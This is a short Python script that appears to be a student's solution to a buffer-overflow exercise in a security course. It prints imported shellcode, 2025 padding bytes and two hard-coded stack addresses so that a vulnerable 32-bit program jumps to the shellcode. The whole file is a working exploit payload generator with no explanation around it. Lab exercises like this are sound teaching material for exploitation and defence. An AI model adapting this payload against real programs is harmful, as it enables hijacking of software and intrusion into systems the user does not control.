#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
shellcode_addr = pack('<I', 0xfffebc48)
saved_eip = pack('<I', 0xfffec45c)
sys.stdout.buffer.write(shellcode + 2025*b'\x69' + shellcode_addr + saved_eip)
